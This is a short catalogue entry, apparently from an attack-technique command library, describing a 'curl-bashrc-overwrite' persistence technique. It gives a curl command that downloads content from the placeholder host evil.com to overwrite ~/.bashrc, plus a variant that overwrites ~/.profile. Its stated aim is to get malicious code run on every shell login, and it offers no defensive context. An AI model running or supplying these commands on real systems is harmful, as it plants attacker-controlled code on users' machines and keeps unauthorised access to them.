---
data: 'curl http://evil.com/ -o "~/.bashrc"'
tags:
  - persistence
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.414Z'
id: fe863a35-31c0-4d4c-9f4d-5196da3b4cc6
verified: false
validated: true
submitted: true
---
# curl-bashrc-overwrite

## Command

```bash
curl http://evil.com/ -o "~/.bashrc"
```

## Description

Overwrites user's .bashrc with malicious content for persistence on shell login.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-o` | Output to home config | Yes |
| `http://evil.com/` | Malicious source | Yes |
| `"~/.bashrc"` | Target file | Yes |

## Examples

### Basic Usage

```bash
curl http://evil.com/ -o "~/.bashrc"
```

### Advanced Usage

```bash
curl http://evil.com/script.sh -o "~/.profile"
```

## Expected Output

File updated; code runs on login.

## Related

- [[commands/curl-authorized-keys-overwrite]]
